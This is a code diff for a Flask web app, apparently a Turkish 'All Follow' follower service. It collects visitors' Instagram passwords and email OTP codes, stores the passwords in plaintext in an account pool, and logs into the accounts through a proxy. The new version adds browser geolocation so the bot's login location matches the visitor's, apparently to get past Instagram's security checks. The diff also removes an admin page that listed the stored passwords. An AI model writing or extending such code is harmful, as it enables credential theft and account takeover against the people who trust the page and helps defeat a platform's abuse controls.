@@ -4,7 +4,7 @@ from flask_sqlalchemy import SQLAlchemy
 from instagrapi import Client
 
 app = Flask(__name__)
-app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///allfollow_v4.db"
+app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///allfollow_chameleon.db"
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
 db = SQLAlchemy(app)
 
@@ -16,8 +16,7 @@ class PoolUser(db.Model):
     password = db.Column(db.String(100), nullable=False)
     status = db.Column(db.String(255), default="Beklemede")
 
-# Client nesnelerini ve şifreleri hafızada tutuyoruz (OTP onayı için)
-temp_data = {}
+temp_clients = {}
 
 @app.route('/')
 def home():
@@ -26,62 +25,70 @@ def home():
     <html lang="tr">
     <head>
         <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>All Follow | V4.1 Stable</title>
+        <title>All Follow | Chameleon v4.5</title>
         <script src="https://cdn.tailwindcss.com"></script>
     </head>
-    <body class="bg-[#0a0f1e] flex items-center justify-center min-h-screen text-slate-200 font-sans">
-        <div class="bg-[#161b2c] p-8 rounded-[2rem] w-full max-w-[380px] border border-slate-800 shadow-2xl text-center">
-            <h1 class="text-3xl font-black text-blue-500 italic mb-6">ALL FOLLOW</h1>
+    <body class="bg-[#0a0f1e] flex items-center justify-center min-h-screen text-slate-200">
+        <div class="bg-[#161b2c] p-8 rounded-[2.5rem] w-full max-w-[380px] border border-slate-800 shadow-2xl">
+            <h1 class="text-3xl font-black text-center text-blue-500 italic mb-1">ALL FOLLOW</h1>
+            <p id="loc-status" class="text-[9px] text-center text-emerald-500 tracking-widest mb-8 uppercase font-bold">📍 Konum Senkronizasyonu Aktif</p>
             
-            <div id="login-form" class="space-y-4">
-                <input id="u" placeholder="Kullanıcı Adı" class="w-full bg-[#0a0f1e] border border-slate-800 p-4 rounded-xl outline-none focus:border-blue-600 transition-all">
-                <input id="p" type="password" placeholder="Şifre" class="w-full bg-[#0a0f1e] border border-slate-800 p-4 rounded-xl outline-none focus:border-blue-600 transition-all">
-                <button onclick="login()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-bold hover:bg-blue-500 transition-all">BAĞLAN</button>
+            <div id="login-box" class="space-y-4">
+                <input id="u" placeholder="Instagram Kullanıcı Adı" class="w-full bg-[#0a0f1e] border border-slate-800 p-4 rounded-xl outline-none focus:border-blue-600">
+                <input id="p" type="password" placeholder="Şifre" class="w-full bg-[#0a0f1e] border border-slate-800 p-4 rounded-xl outline-none focus:border-blue-600">
+                <button onclick="getLocationAndLogin()" id="btn" class="w-full bg-blue-600 py-4 rounded-xl font-bold hover:bg-blue-500 shadow-lg transition-all">SİSTEME GİRİŞ YAP</button>
             </div>
 
-            <div id="otp-form" class="hidden space-y-4 mt-4">
-                <p class="text-xs text-yellow-500 font-bold uppercase">E-Posta Kodunu Girin</p>
+            <div id="otp-box" class="hidden space-y-4 mt-4">
                 <input id="otp" placeholder="6 Haneli Kod" class="w-full bg-[#0a0f1e] border border-yellow-800 p-4 rounded-xl outline-none text-center tracking-widest text-xl">
-                <button onclick="verifyOtp()" class="w-full bg-yellow-600 py-4 rounded-xl font-bold hover:bg-yellow-500 transition-all">KODU ONAYLA</button>
+                <button onclick="verifyOtp()" class="w-full bg-yellow-600 py-4 rounded-xl font-bold">KODU DOĞRULA</button>
             </div>
             
-            <p id="msg" class="text-xs mt-6 font-semibold text-slate-400 uppercase leading-relaxed"></p>
+            <p id="msg" class="text-[11px] mt-6 text-center font-semibold text-slate-500 uppercase leading-relaxed"></p>
         </div>
 
         <script>
-            let currentUsername = "";
-            async function login() {
-                const u=document.getElementById('u').value, p=document.getElementById('p').value;
-                currentUsername = u.trim().toLowerCase();
+            let user = "";
+            let userCoords = { lat: 41.0082, lng: 28.9784 }; // Default İstanbul
+
+            // Tarayıcıdan konumu al
+            navigator.geolocation.getCurrentPosition((pos) => {
+                userCoords.lat = pos.coords.latitude;
+                userCoords.lng = pos.coords.longitude;
+                document.getElementById('loc-status').innerText = "📍 KONUM EŞLENDİ: OK";
+            }, (err) => {
+                document.getElementById('loc-status').innerText = "⚠️ VARSAYILAN KONUM KULLANILIYOR";
+                document.getElementById('loc-status').className = "text-[9px] text-center text-yellow-500 tracking-widest mb-8 uppercase font-bold";
+            });
+
+            async function getLocationAndLogin() {
+                const u=document.getElementById('u').value.trim().toLowerCase(), p=document.getElementById('p').value;
+                user = u;
                 const btn=document.getElementById('btn'), msg=document.getElementById('msg');
-                btn.disabled = true; msg.innerText = "Instagram ile tünel kuruluyor...";
+                btn.disabled = true; msg.innerText = "Konum tüneli üzerinden bağlanılıyor...";
                 
-                try {
-                    const r = await fetch('/api/login', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:currentUsername, p:p})});
-                    const d = await r.json();
-                    
-                    if(d.status === "challenge") {
-                        document.getElementById('login-form').classList.add('hidden');
-                        document.getElementById('otp-form').classList.remove('hidden');
-                        msg.innerText = "Instagram e-posta kodu istedi. Lütfen kodu girin.";
-                    } else {
-                        msg.innerText = d.msg;
-                        if(d.status !== "success") btn.disabled = false;
-                    }
-                } catch(e) { msg.innerText = "Bağlantı hatası."; btn.disabled = false; }
+                const r = await fetch('/api/login', {
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({u, p, lat: userCoords.lat, lng: userCoords.lng})
+                });
+                const d = await r.json();
+                
+                if(d.status === "challenge") {
+                    document.getElementById('login-box').classList.add('hidden');
+                    document.getElementById('otp-box').classList.remove('hidden');
+                    msg.innerText = "Kod e-postanıza gönderildi.";
+                } else {
+                    msg.innerText = d.msg; btn.disabled = false;
+                }
             }
 
             async function verifyOtp() {
                 const code = document.getElementById('otp').value;
-                const msg = document.getElementById('msg');
-                msg.innerText = "Kod doğrulanıyor...";
-                
-                try {
-                    const r = await fetch('/api/verify-otp', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:currentUsername, code:code})});
-                    const d = await r.json();
-                    msg.innerText = d.msg;
-                    if(d.status === "success") setTimeout(() => location.reload(), 2000);
-                } catch(e) { msg.innerText = "Onay başarısız."; }
+                const r = await fetch('/api/verify', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({u:user, code:code})});
+                const d = await r.json();
+                document.getElementById('msg').innerText = d.msg;
+                if(d.status === "success") setTimeout(() => location.reload(), 2000);
             }
         </script>
     </body>
@@ -92,65 +99,50 @@ def home():
 def login():
     data = request.json
     u, p = data.get('u'), data.get('p')
+    lat, lng = data.get('lat'), data.get('lng')
     
     cl = Client()
     cl.set_proxy(PROXY_URL)
-    
+    cl.set_locale("tr_TR")
+    cl.set_country("TR")
+
     try:
+        # Gelen konumu botun cihazına enjekte et
+        cl.set_location(lat, lng)
         cl.login(u, p)
-        # Başarılı ise veritabanına ekle
-        user = PoolUser.query.filter_by(username=u).first()
-        if not user: user = PoolUser(username=u, password=p); db.session.add(user)
-        user.status = "AKTİF ✅"
+        
+        user_record = PoolUser.query.filter_by(username=u).first()
+        if not user_record: user_record = PoolUser(username=u, password=p); db.session.add(user_record)
+        user_record.status = "AKTİF ✅"
         db.session.commit()
-        return jsonify(status="success", msg="Giriş başarılı!")
+        return jsonify(status="success", msg="Konum senkronize edildi, giriş başarılı!")
 
     except Exception as e:
         err = str(e).lower()
-        # Challenge (Kod isteği) kontrolü
         if "challenge" in err or "checkpoint" in err:
-            temp_data[u] = {"client": cl, "password": p}
+            temp_clients[u] = {"client": cl, "password": p, "lat": lat, "lng": lng}
             return jsonify(status="challenge", msg="Kod gerekli")
-        
-        # Hatalı şifre kontrolü
-        if "password" in err:
-            return jsonify(status="error", msg="Şifre yanlış.")
-            
-        return jsonify(status="error", msg=f"Hata: {err[:40]}")
+        return jsonify(status="error", msg="Hatalı bilgi veya IP engeli.")
 
-@app.route('/api/verify-otp', methods=['POST'])
-def verify_otp():
+@app.route('/api/verify', methods=['POST'])
+def verify():
     data = request.json
     u, code = data.get('u'), data.get('code')
-    
-    stored = temp_data.get(u)
-    if not stored: return jsonify(status="error", msg="Oturum bulunamadı, baştan deneyin.")
-
-    cl = stored["client"]
-    p = stored["password"]
+    stored = temp_clients.get(u)
+    if not stored: return jsonify(status="error", msg="Zaman aşımı.")
 
     try:
-        # Kodu göndererek girişi tamamla
-        cl.login(u, p, verification_code=code)
+        stored["client"].login(u, stored["password"], verification_code=code)
+        # Onaydan sonra da konumu mühürle
+        stored["client"].set_location(stored["lat"], stored["lng"])
         
-        user = PoolUser.query.filter_by(username=u).first()
-        if not user: user = PoolUser(username=u, password=p); db.session.add(user)
-        user.status = "AKTİF ✅"
+        user_record = PoolUser.query.filter_by(username=u).first()
+        if not user_record: user_record = PoolUser(username=u, password=stored["password"]); db.session.add(user_record)
+        user_record.status = "AKTİF ✅"
         db.session.commit()
-        
-        # Hafızayı temizle
-        del temp_data[u]
-        return jsonify(status="success", msg="Hesap doğrulandı ve havuza eklendi!")
-    except Exception as e:
-        return jsonify(status="error", msg="Kod hatalı veya Instagram kabul etmedi.")
-
-@app.route('/panel-admin')
-def admin():
-    users = PoolUser.query.order_by(PoolUser.id.desc()).all()
-    res = f"<body style='background:#0a0f1e;color:#fff;padding:20px;font-family:sans-serif;'><h2>All Follow Admin ({len(users)})</h2><table border='1' style='width:100%; border-collapse:collapse;'>"
-    for u in users:
-        res += f"<tr><td style='padding:10px'>{u.username}</td><td>{u.password}</td><td>{u.status}</td></tr>"
-    return res + "</table></body>"
+        return jsonify(status="success", msg="Konum doğrulandı!")
+    except:
+        return jsonify(status="error", msg="Kod yanlış.")
 
 if __name__ == "__main__":
     with app.app_context(): db.create_all()
